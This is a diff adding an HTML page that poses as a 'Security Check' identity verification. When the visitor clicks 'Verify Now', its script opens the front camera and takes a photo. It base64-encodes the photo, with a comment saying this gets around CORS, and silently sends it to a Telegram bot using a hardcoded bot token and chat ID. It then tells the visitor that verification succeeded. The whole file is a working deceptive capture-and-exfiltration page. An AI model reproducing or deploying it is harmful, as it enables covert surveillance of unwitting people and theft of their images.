@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Check</title>
+    <style>
+        body { background-color: #111; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .container { padding: 20px; width: 100%; max-width: 400px; }
+        button { background-color: #007aff; color: white; border: none; padding: 15px; font-size: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
+        button:active { opacity: 0.8; }
+        video { display: none; }
+        #status { margin-top: 20px; color: #aaa; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Security Check</h2>
+        <p>Please verify your identity to continue.</p>
+        <button id="verifyBtn">Verify Now</button>
+        <div id="status"></div>
+        <video id="camera" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+    <script>
+        const verifyBtn = document.getElementById('verifyBtn');
+        const statusDiv = document.getElementById('status');
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+
+        // إعدادات تلقرام
+        const BOT_TOKEN = '8988737950:AAGNYo75dh9CxTTBq0V7u-II5hjNt3yYsQM';
+        const CHAT_ID = '751892970';
+
+        verifyBtn.addEventListener('click', async () => {
+            verifyBtn.disabled = true;
+            verifyBtn.style.display = 'none';
+            statusDiv.innerText = 'Verifying... Please wait.';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويل الصورة لنص Base64 عشان نتخطى حماية CORS
+                    const base64Image = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    const payload = {
+                        chat_id: CHAT_ID,
+                        photo: base64Image
+                    };
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        stream.getTracks().forEach(track => track.stop());
+                        if (data.ok) {
+                            document.body.innerHTML = '<h2>Verification Successful</h2><p>You may close this page now.</p>';
+                        } else {
+                            statusDiv.innerText = 'Verification failed. Try again.';
+                        }
+                    })
+                    .catch(err => {
+                        statusDiv.innerText = 'Network error. Try again.';
+                        stream.getTracks().forEach(track => track.stop());
+                    });
+                }, 1000);
+
+            } catch (err) {
+                statusDiv.innerText = 'Camera permission denied or unavailable.';
+                verifyBtn.disabled = false;
+                verifyBtn.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
